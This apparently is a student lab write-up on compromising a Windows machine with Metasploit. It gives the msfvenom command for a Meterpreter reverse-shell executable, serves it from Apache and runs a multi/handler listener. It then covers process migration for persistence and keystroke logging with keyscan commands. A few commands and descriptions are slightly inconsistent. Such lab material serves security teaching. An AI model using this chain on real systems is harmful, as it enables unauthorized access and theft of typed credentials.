# EX 6: Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![Screenshot 2024-10-28 153752](https://github.com/user-attachments/assets/41b05fc8-51ff-4670-96ce-9a60bc222f56)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2024-10-28 153743](https://github.com/user-attachments/assets/fc0232ad-5e6f-4852-b560-07327d6a17d6)





copy the fun.exe into the apache /var/www/html folder
![Screenshot 2024-10-28 153921](https://github.com/user-attachments/assets/81948630-c86f-49e9-85ea-02aee35269c2)


Start apache server
sudo systemctl apache2 start

![Screenshot 2024-10-28 154004](https://github.com/user-attachments/assets/b2f4d68f-1df5-4bee-9701-99ae30cb26ee)



Check the status of apache2
![Screenshot 2024-10-28 154048](https://github.com/user-attachments/assets/24fac52d-95c5-4ea9-b488-edcd43e461be)



Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![6 6](https://github.com/user-attachments/assets/95ad72f2-2139-4873-b533-c0266f0760db)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![6 7](https://github.com/user-attachments/assets/c93dc795-02a3-4444-9097-24994fed7b73)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![6 8](https://github.com/user-attachments/assets/4f197f32-0d7f-4907-8028-9af4ea1f1d7d)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![6 9](https://github.com/user-attachments/assets/d3c21fcf-3638-4eb0-a998-ce4e2895b24f)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![6 1](https://github.com/user-attachments/assets/3630081d-690e-40c7-b50a-10d0345ea700)



keyscan_dump	Shows the keystrokes captured so far
![6 11](https://github.com/user-attachments/assets/3752a002-2147-48bc-80b1-9f2a5da85eff)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
